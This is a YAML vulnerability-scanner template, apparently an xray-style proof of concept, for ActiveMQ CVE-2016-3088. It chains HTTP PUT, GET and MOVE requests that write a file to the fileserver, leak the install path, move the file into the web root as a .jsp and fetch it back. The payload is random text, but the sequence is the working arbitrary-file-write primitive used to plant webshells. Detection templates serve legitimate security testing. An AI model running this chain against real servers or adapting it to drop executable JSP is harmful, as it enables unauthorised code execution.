detail:
  author: j4ckzh0u(https://github.com/j4ckzh0u)
  links:
  - https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2016-3088
expression: r0() && r1() && r2() && r3()
manual: true
name: poc-yaml-activemq-cve-2016-3088
rules:
  r0:
    expression: response.status == 204
    request:
      body: '{{fileContent}}

        '
      cache: true
      method: PUT
      path: /fileserver/{{filename}}.txt
  r1:
    expression: response.status == 200
    output:
      home: search["home"]
      search: '"activemq.home=(?P<home>.*?),".bsubmatch(response.body)'
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /admin/test/index.jsp
  r2:
    expression: response.status == 204
    request:
      cache: true
      follow_redirects: false
      headers:
        Destination: file://{{home}}/webapps/api/{{filename}}.jsp
      method: MOVE
      path: /fileserver/{{filename}}.txt
  r3:
    expression: response.status == 200 && response.body.bcontains(bytes(fileContent))
    request:
      cache: true
      follow_redirects: false
      method: GET
      path: /api/{{filename}}.jsp
set:
  fileContent: randomLowercase(6)
  filename: randomLowercase(6)
transport: http
